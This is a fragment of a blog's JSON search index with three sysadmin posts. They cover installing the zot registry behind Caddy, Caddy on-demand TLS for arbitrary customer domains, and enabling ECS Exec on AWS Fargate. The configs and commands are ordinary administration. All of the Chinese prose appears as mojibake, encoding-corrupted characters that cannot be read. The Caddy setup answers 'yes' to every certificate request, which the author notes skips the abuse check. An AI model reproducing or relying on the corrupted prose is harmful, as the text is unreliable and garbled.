[Unit] After=network.target Wants=network.target [Service] WorkingDirectory=/usr/local/bin/ Type=simple User=root ExecStart=/usr/local/bin/caddy run --config /usr/local/bin/Caddyfile Restart=on-failure RestartSec=1s [Install] WantedBy=multi-user.target EOF åˆ†åˆ«å¯åŠ¨æœåŠ¡å°±å¥½äº†\nsystemctl daemon-reload systemctl start zot systemctl start caddy å› ä¸ºå®Œå…¨æ²¡æœ‰webç•Œé¢ï¼Œåªèƒ½ç”¨curlè¿›è¡Œæµ‹è¯•äº†\ncurl -u user01:password http://localhost:5000/v2/_catalog -vvvv æˆåŠŸåç”¨docker loginåï¼Œdocker pushã€docker pull è¿›è¡ŒéªŒè¯å°±OKäº†\n","permalink":"https://rendoumi.com/posts/20251111-zot_registry/","summary":"\u003cp\u003eæœåŠ¡å™¨åœ¨HKï¼Œä½†æ˜¯å»æ‹‰å–è…¾è®¯å¹¿å·Dockeré•œåƒä»“çš„æ—¶å€™æ€»æ˜¯å¤±è´¥ï¼Œè¿˜æ˜¯ä¼ä¸šç‰ˆï¼Œå¤§æ— è¯­äº†ã€‚\u003c/p\u003e\n\u003cp\u003eæ²¡åŠæ³•ï¼Œè¢«é€¼æ— å¥ˆï¼Œå¹²è„†åœ¨HKå»ºä¸€ä¸ªé•œåƒä»“ï¼Œç„¶åæ¨é€åˆ°é‚£é‡Œï¼Œè¿™æ ·å°±æ–¹ä¾¿äº†ã€‚\u003c/p\u003e\n\u003cp\u003eåˆšå¼€å§‹çš„æƒ³æ³•æ˜¯ç”¨Harborï¼Œä½†æ˜¯Harborå®åœ¨å¤ªæ²‰é‡äº†ï¼Œè€Œä¸”Harborçš„æœ€å¤§é—®é¢˜æ˜¯è¿‡æœŸé•œåƒæ¸…ç†ï¼Œå¦‚æœè¿‡æœŸé•œåƒå‡ºé”™äº†ï¼Œé‚£æ˜¯æ¸…ç†ä¸æ‰çš„ï¼Œé™¤éé‡æ–°æ‰“åŒ…ä¸Šä¼ è¦†ç›–æ‰é”™è¯¯çš„é•œåƒï¼Œç„¶åå†åˆ é™¤æ‰å¯ä»¥ï¼Œä½†é—®é¢˜æ˜¯å¦‚æœæœ‰700ã€800ä¸ªé”™çš„é•œåƒï¼Œé‚£æ˜¯çœŸæ²¡æœ‰é‚£ä¸ªåŠ²å»æ¸…ç†äº†ã€‚\u003c/p\u003e\n\u003cp\u003eé‚£è¿™æ¬¡å°±æƒ³å»ºä¸ªè½»é‡çº§çš„ï¼Œå¹²è„†è¿WEBç•Œé¢éƒ½ä¸è¦ï¼Œåªè¦docker loginåèƒ½pushå’Œpullå³å¯ï¼\u003c/p\u003e\n\u003cp\u003eè¿™æ ·çš„è¯zotæ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ï¼Œzotæ˜¯å…¼å®¹ociæ ‡å‡†çš„ï¼ŒæŸäº›åœ°æ–¹è·Ÿdockeræ˜¯ä¸å…¼å®¹çš„ï¼š\u003c/p\u003e\n\u003cp\u003eä¸‹è½½zot\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget https://github.com/project-zot/zot/releases/download/v2.1.10/zot-linux-amd64\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå‡†å¤‡é…ç½®æ–‡ä»¶\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat \u0026gt;/usr/local/bin/config.json \u003cspan class=\"s\"\u003e\u0026lt;\u0026lt; EOF\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026#34;distSpecVersion\u0026#34;: \u0026#34;1.0.0-dev\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026#34;http\u0026#34;: {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;address\u0026#34;: \u0026#34;127.0.0.1\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;port\u0026#34;: \u0026#34;5000\u0026#34;,\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;compat\u0026#34;: [\u0026#34;docker2s2\u0026#34;],\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;auth\u0026#34;: {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      \u0026#34;htpasswd\u0026#34;: {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e        \u0026#34;path\u0026#34;: \u0026#34;/usr/local/bin/htpasswd\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e      }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  },\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  \u0026#34;storage\u0026#34;: {\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e    \u0026#34;rootDirectory\u0026#34;: \u0026#34;/data/registry\u0026#34;\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e  }\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"s\"\u003eEOF\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢compatï¼Œå¦‚æœä¸é…ç½®ï¼Œå°±ä¼šå‡ºç°pushçš„æ—¶å€™å‡ºç°\u003ccode\u003emanifest invalid\u003c/code\u003eé”™è¯¯ï¼Œè¿™æ˜¯å› ä¸ºdockerå’Œociçš„æ ‡å‡†ä¸åŒï¼Œzotæ˜¯éµå¾ªociæ ‡å‡†çš„\u003c/p\u003e\n\u003cp\u003eå‡†å¤‡htpasswdï¼Œå¿…é¡»ç”¨bcryptçš„æ–¹å¼ï¼Œzotä¸æ”¯æŒå…¶å®ƒçš„ï¼\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e-B  Force bcrypt hashing of the password \u003cspan class=\"o\"\u003e(\u003c/span\u003every secure\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehtpasswd -B -c /usr/local/bin/htpasswd user01\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eå‡†å¤‡\u003ccode\u003ezot.service\u003c/code\u003e\u003c/p\u003e","title":"å®‰è£…è½»é‡çº§çš„Docker registryï¼šzot"},{"content":"å…¬å¸çš„SAASå¹³å°ï¼Œæœ¬æ¥å¤šç§Ÿæˆ·çš„è¯ä¹¦ç®¡ç†æ¨¡å¼é¢„è®¡æ˜¯è¿™æ ·çš„ï¼š\nç»™æ¯ä¸ªç§Ÿæˆ·å•ç‹¬è®¾ç«‹ä¸€ä¸ª xyz.alibaba.com çš„å­åŸŸåï¼Œç„¶åç”¨cert-managerç®¡ç†è¯ä¹¦ï¼Œåªè¦annouceä¸€ä¸ª xyz.alibaba.com çš„ingresså‡ºæ¥ï¼Œå°±ä¼šè‡ªåŠ¨ç­¾å‘è¯ä¹¦ã€‚\nç„¶è€Œç ”å‘è§‰å¾—è¿™æ ·ä¹Ÿæ˜¯å¾ˆä¸çˆ½ï¼Œè¿annouce ingressä¹Ÿä¸æ„¿æ„ï¼Œå°±æƒ³å®¢æˆ·çš„åŸŸåç›´æ¥è§£æä¸€ä¸ª xyz.å®¢æˆ·.com çš„ cname è¿‡æ¥ï¼Œç„¶åå°±è‡ªåŠ¨ç­¾å‘è¯ä¹¦ã€‚\nè¿™ä¸ªéœ€æ±‚çœŸçš„æ˜¯å¾ˆæœ‰æ„æ€ï¼Œä¹Ÿåªæœ‰caddyèƒ½å¾ˆè½»æ¾çš„è¿™ä¹ˆå®ç°ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\nä¸€ã€åšå¥½ä¸€ä¸ªcaddyçš„deployå’Œserviceï¼Œå‰é¢ç›´æ¥é¡¶ä¸€ä¸ªLoadbalance\näºŒã€é…ç½®caddyçš„é…ç½®\n/etc/caddy/Caddyfile çš„å†…å®¹\n{ debug on_demand_tls { ask http://localhost:5555/ } } https:// { tls { on_demand } handle { reverse_proxy https://alibaba.com { header_up Host alibaba.com } } respond \u0026#34;Welcome to dynamic certificate signing!\u0026#34; 200 } http://localhost:5555 { respond 200 } æ³¨æ„ä¸Šé¢ï¼ŒCaddyå¯¹è¿™ç§éšä¾¿çš„åŸŸåï¼Œæ˜¯è¦æ±‚å»é—®ä¸€ä¸‹åç«¯çš„æœåŠ¡æ˜¯å¦å¯¹è¿™ä¸ªåŸŸåè¿›è¡Œç­¾å‘çš„ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢æ»¥ç”¨ã€‚\næˆ‘ä»¬ç›´æ¥åšä¸ªè™šæ‹ŸæœåŠ¡ï¼Œå›åº”200å³å¯\nè¿™æ ·çš„åšæ³•æ¯”è¾ƒç›´æ¥äº†å½“ï¼Œå½“ç„¶åªé€‚ç”¨äºå›½å¤–ï¼Œå›½å†…å°±éº»çƒ¦äº†ï¼ŒæœªçŸ¥çš„åŸŸåè§£æåˆ°ä½ çš„ipä¸Šï¼Œæ²¡å¤‡æ¡ˆç›´æ¥å°±ä¼šè¢«å°ç«™ã€‚\n","permalink":"https://rendoumi.com/posts/20251110-caddy_wild_certificate/","summary":"\u003cp\u003eå…¬å¸çš„SAASå¹³å°ï¼Œæœ¬æ¥å¤šç§Ÿæˆ·çš„è¯ä¹¦ç®¡ç†æ¨¡å¼é¢„è®¡æ˜¯è¿™æ ·çš„ï¼š\u003c/p\u003e\n\u003cp\u003eç»™æ¯ä¸ªç§Ÿæˆ·å•ç‹¬è®¾ç«‹ä¸€ä¸ª xyz.alibaba.com çš„å­åŸŸåï¼Œç„¶åç”¨cert-managerç®¡ç†è¯ä¹¦ï¼Œåªè¦annouceä¸€ä¸ª xyz.alibaba.com çš„ingresså‡ºæ¥ï¼Œå°±ä¼šè‡ªåŠ¨ç­¾å‘è¯ä¹¦ã€‚\u003c/p\u003e\n\u003cp\u003eç„¶è€Œç ”å‘è§‰å¾—è¿™æ ·ä¹Ÿæ˜¯å¾ˆä¸çˆ½ï¼Œè¿annouce ingressä¹Ÿä¸æ„¿æ„ï¼Œå°±æƒ³å®¢æˆ·çš„åŸŸåç›´æ¥è§£æä¸€ä¸ª xyz.å®¢æˆ·.com çš„ cname è¿‡æ¥ï¼Œç„¶åå°±è‡ªåŠ¨ç­¾å‘è¯ä¹¦ã€‚\u003c/p\u003e\n\u003cp\u003eè¿™ä¸ªéœ€æ±‚çœŸçš„æ˜¯å¾ˆæœ‰æ„æ€ï¼Œä¹Ÿåªæœ‰caddyèƒ½å¾ˆè½»æ¾çš„è¿™ä¹ˆå®ç°ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cp\u003eä¸€ã€åšå¥½ä¸€ä¸ªcaddyçš„deployå’Œserviceï¼Œå‰é¢ç›´æ¥é¡¶ä¸€ä¸ªLoadbalance\u003c/p\u003e\n\u003cp\u003eäºŒã€é…ç½®caddyçš„é…ç½®\u003c/p\u003e\n\u003cp\u003e/etc/caddy/Caddyfile çš„å†…å®¹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    debug\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    on_demand_tls \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        ask http://localhost:5555/\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttps:// \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    tls \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        on_demand\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    handle \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        reverse_proxy https://alibaba.com \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e            header_up Host alibaba.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    respond \u003cspan class=\"s2\"\u003e\u0026#34;Welcome to dynamic certificate signing!\u0026#34;\u003c/span\u003e \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ehttp://localhost:5555 \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        respond \u003cspan class=\"m\"\u003e200\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ³¨æ„ä¸Šé¢ï¼ŒCaddyå¯¹è¿™ç§éšä¾¿çš„åŸŸåï¼Œæ˜¯è¦æ±‚å»é—®ä¸€ä¸‹åç«¯çš„æœåŠ¡æ˜¯å¦å¯¹è¿™ä¸ªåŸŸåè¿›è¡Œç­¾å‘çš„ï¼Œè¿™æ˜¯ä¸ºäº†é˜²æ­¢æ»¥ç”¨ã€‚\u003c/p\u003e\n\u003cp\u003eæˆ‘ä»¬ç›´æ¥åšä¸ªè™šæ‹ŸæœåŠ¡ï¼Œå›åº”200å³å¯\u003c/p\u003e\n\u003cp\u003eè¿™æ ·çš„åšæ³•æ¯”è¾ƒç›´æ¥äº†å½“ï¼Œå½“ç„¶åªé€‚ç”¨äºå›½å¤–ï¼Œå›½å†…å°±éº»çƒ¦äº†ï¼ŒæœªçŸ¥çš„åŸŸåè§£æåˆ°ä½ çš„ipä¸Šï¼Œæ²¡å¤‡æ¡ˆç›´æ¥å°±ä¼šè¢«å°ç«™ã€‚\u003c/p\u003e","title":"Caddyè‡ªåŠ¨ç­¾å‘ä»»æ„åŸŸåè¯ä¹¦"},{"content":"å…¬å¸ç”¨åˆ°äº†Amazon Elastic Container Serviceï¼Œå®Œå…¨æ‰˜ç®¡çš„å®¹å™¨æœåŠ¡\næœåŠ¡å™¨ç”¨çš„æ˜¯Fargateï¼Œæ²¡æœ‰è‡ªå·±çš„æœåŠ¡å™¨ï¼Œçº¯æ‰˜ç®¡çš„ï¼Œå¼€å§‹éƒ¨ç½²çš„æ—¶å€™ï¼Œä¹Ÿæ²¡æœ‰è€ƒè™‘åˆ°æœ‰ä¸€å¤©è¦è¿›å…¥å®¹å™¨è¿›è¡Œè°ƒè¯•ã€‚\nç°åœ¨éº»çƒ¦å°±æ¥äº†ï¼Œéœ€è¦è¿›å…¥å®¹å™¨ï¼ŒæŸ¥çœ‹æ–‡ä»¶æ—¥å¿—\nç»“æœå°±å¾ˆéº»çƒ¦ï¼Œè§£å†³çš„æ­¥éª¤å¦‚ä¸‹ï¼š\nä¸€ã€æŸ¥çœ‹é›†ç¾¤çŠ¶æ€ï¼Œçœ‹çœ‹ä»»åŠ¡å®šä¹‰çš„ç‰ˆæœ¬å·ï¼Œä¸‹é¢æ˜¯206 äºŒã€å»åˆ°ç›¸åº”çš„ä»»åŠ¡å®šä¹‰ æ³¨æ„ï¼Œç°åœ¨åªæœ‰ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œè§’è‰²ï¼Œä»»åŠ¡è§’è‰²æ˜¯ä¸ªç©ºçš„ï¼ï¼ï¼\nç„¶åæˆ‘ä»¬ç‚¹å¼€ä»»åŠ¡æ‰§è¡Œè§’è‰²ï¼Œæ·»åŠ æƒé™\nåˆå§‹åŒ–çš„æ—¶å€™åªæœ‰AmazonECSTaskExecutionRolePolicy, æˆ‘ä»¬éœ€è¦åŠ ä¸ŠAmazonSSMManagedInstanceCore\nåŠ å®Œå°±ä¸Šé¢ä¸€æ ·ã€‚\nä¸‰ã€è¿”å›åˆ°ä»»åŠ¡å®šä¹‰ï¼Œä½¿ç”¨JSONåˆ›å»ºæ–°ä¿®è®¢ \u0026#34;taskRoleArn\u0026#34;: \u0026#34;arn:xxxx:ecsTaskExecutionRole\u0026#34;, \u0026#34;executionRoleArn\u0026#34;: \u0026#34;arn:ecsTaskExecutionRole\u0026#34;, æ–°å¢taskRoleArnï¼Œå’ŒexecutionRoleArnä¿æŒä¸€è‡´ï¼Œç„¶åä¿å­˜\nå››ã€æŒ‰ç…§æ–°ç‰ˆæœ¬ï¼Œéƒ¨ç½²æ–°ä»»åŠ¡ ä»æ–°ä»»åŠ¡å®šä¹‰æ›´æ–°æœåŠ¡\né€‰æ‹©ç›¸åº”é›†ç¾¤ï¼Œç›¸åº”æœåŠ¡\næ•…éšœæ’é™¤é…ç½®ï¼ŒåŠ¡å¿…å¼€å¯ECS execï¼Œç„¶åæ›´æ–°å³å¯\näº”ã€å¼€å¯å®¹å™¨çš„shell æˆ‘å»é›†ç¾¤\u0026ndash;æœåŠ¡\u0026ndash;å®¹å™¨ï¼Œç‚¹å‡»è¿æ¥\naws ecs execute-command --cluster yoov_work_e_form_prod_cluster --task 23xxxxx --container yontainer --interactive --command \u0026#39;/bin/sh\u0026#39; å®é™…å¯¹åº”çš„å‘½ä»¤å¦‚ä¸Šã€‚å…¶å®ä¹Ÿå¯ä»¥ç”¨awsçš„cliå®¢æˆ·ç«¯ç›´æ¥æ‰§è¡Œï¼Œåªä¸è¿‡è¦æ‹¿åˆ°é›†ç¾¤åå’Œå®¹å™¨åã€‚\n","permalink":"https://rendoumi.com/posts/20251110-aws-ecs_fargate/","summary":"\u003cp\u003eå…¬å¸ç”¨åˆ°äº†\u003ccode\u003eAmazon Elastic Container Service\u003c/code\u003eï¼Œå®Œå…¨æ‰˜ç®¡çš„å®¹å™¨æœåŠ¡\u003c/p\u003e\n\u003cp\u003eæœåŠ¡å™¨ç”¨çš„æ˜¯Fargateï¼Œæ²¡æœ‰è‡ªå·±çš„æœåŠ¡å™¨ï¼Œçº¯æ‰˜ç®¡çš„ï¼Œå¼€å§‹éƒ¨ç½²çš„æ—¶å€™ï¼Œä¹Ÿæ²¡æœ‰è€ƒè™‘åˆ°æœ‰ä¸€å¤©è¦è¿›å…¥å®¹å™¨è¿›è¡Œè°ƒè¯•ã€‚\u003c/p\u003e\n\u003cp\u003eç°åœ¨éº»çƒ¦å°±æ¥äº†ï¼Œéœ€è¦è¿›å…¥å®¹å™¨ï¼ŒæŸ¥çœ‹æ–‡ä»¶æ—¥å¿—\u003c/p\u003e\n\u003cp\u003eç»“æœå°±å¾ˆéº»çƒ¦ï¼Œè§£å†³çš„æ­¥éª¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch5 id=\"ä¸€æŸ¥çœ‹é›†ç¾¤çŠ¶æ€çœ‹çœ‹ä»»åŠ¡å®šä¹‰çš„ç‰ˆæœ¬å·ä¸‹é¢æ˜¯206\"\u003eä¸€ã€æŸ¥çœ‹é›†ç¾¤çŠ¶æ€ï¼Œçœ‹çœ‹ä»»åŠ¡å®šä¹‰çš„ç‰ˆæœ¬å·ï¼Œä¸‹é¢æ˜¯206\u003c/h5\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110091259097\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110091259097.png\"\u003e\u003c/p\u003e\n\u003ch5 id=\"äºŒå»åˆ°ç›¸åº”çš„ä»»åŠ¡å®šä¹‰\"\u003eäºŒã€å»åˆ°ç›¸åº”çš„ä»»åŠ¡å®šä¹‰\u003c/h5\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110091853031\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110091853031.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ³¨æ„ï¼Œç°åœ¨åªæœ‰ä¸€ä¸ªä»»åŠ¡æ‰§è¡Œè§’è‰²ï¼Œä»»åŠ¡è§’è‰²æ˜¯ä¸ªç©ºçš„ï¼ï¼ï¼\u003c/p\u003e\n\u003cp\u003eç„¶åæˆ‘ä»¬ç‚¹å¼€ä»»åŠ¡æ‰§è¡Œè§’è‰²ï¼Œæ·»åŠ æƒé™\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110092123633\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110092123633.png\"\u003e\u003c/p\u003e\n\u003cp\u003eåˆå§‹åŒ–çš„æ—¶å€™åªæœ‰\u003ccode\u003eAmazonECSTaskExecutionRolePolicy\u003c/code\u003e, æˆ‘ä»¬éœ€è¦åŠ ä¸Š\u003ccode\u003eAmazonSSMManagedInstanceCore\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003eåŠ å®Œå°±ä¸Šé¢ä¸€æ ·ã€‚\u003c/p\u003e\n\u003ch5 id=\"ä¸‰è¿”å›åˆ°ä»»åŠ¡å®šä¹‰ä½¿ç”¨jsonåˆ›å»ºæ–°ä¿®è®¢\"\u003eä¸‰ã€è¿”å›åˆ°ä»»åŠ¡å®šä¹‰ï¼Œä½¿ç”¨JSONåˆ›å»ºæ–°ä¿®è®¢\u003c/h5\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110092432190\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110092432190.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;taskRoleArn\u0026#34;\u003c/span\u003e:      \u003cspan class=\"s2\"\u003e\u0026#34;arn:xxxx:ecsTaskExecutionRole\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"s2\"\u003e\u0026#34;executionRoleArn\u0026#34;\u003c/span\u003e: \u003cspan class=\"s2\"\u003e\u0026#34;arn:ecsTaskExecutionRole\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ–°å¢taskRoleArnï¼Œå’ŒexecutionRoleArnä¿æŒä¸€è‡´ï¼Œç„¶åä¿å­˜\u003c/p\u003e\n\u003ch5 id=\"å››æŒ‰ç…§æ–°ç‰ˆæœ¬éƒ¨ç½²æ–°ä»»åŠ¡\"\u003eå››ã€æŒ‰ç…§æ–°ç‰ˆæœ¬ï¼Œéƒ¨ç½²æ–°ä»»åŠ¡\u003c/h5\u003e\n\u003cp\u003eä»æ–°ä»»åŠ¡å®šä¹‰æ›´æ–°æœåŠ¡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110100003930\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110100003930.png\"\u003e\u003c/p\u003e\n\u003cp\u003eé€‰æ‹©ç›¸åº”é›†ç¾¤ï¼Œç›¸åº”æœåŠ¡\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110100041558\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110100041558.png\"\u003e\u003c/p\u003e\n\u003cp\u003eæ•…éšœæ’é™¤é…ç½®ï¼ŒåŠ¡å¿…å¼€å¯ECS execï¼Œç„¶åæ›´æ–°å³å¯\u003cimg alt=\"image-20251110100113356\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110100113356.png\"\u003e\u003c/p\u003e\n\u003ch5 id=\"äº”å¼€å¯å®¹å™¨çš„shell\"\u003eäº”ã€å¼€å¯å®¹å™¨çš„shell\u003c/h5\u003e\n\u003cp\u003eæˆ‘å»é›†ç¾¤\u0026ndash;æœåŠ¡\u0026ndash;å®¹å™¨ï¼Œç‚¹å‡»è¿æ¥\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20251110100318440\" loading=\"lazy\" src=\"/posts/20251110-aws-ecs_fargate/image-20251110100318440.png\"\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eaws ecs execute-command --cluster yoov_work_e_form_prod_cluster --task 23xxxxx --container yontainer --interactive --command \u003cspan 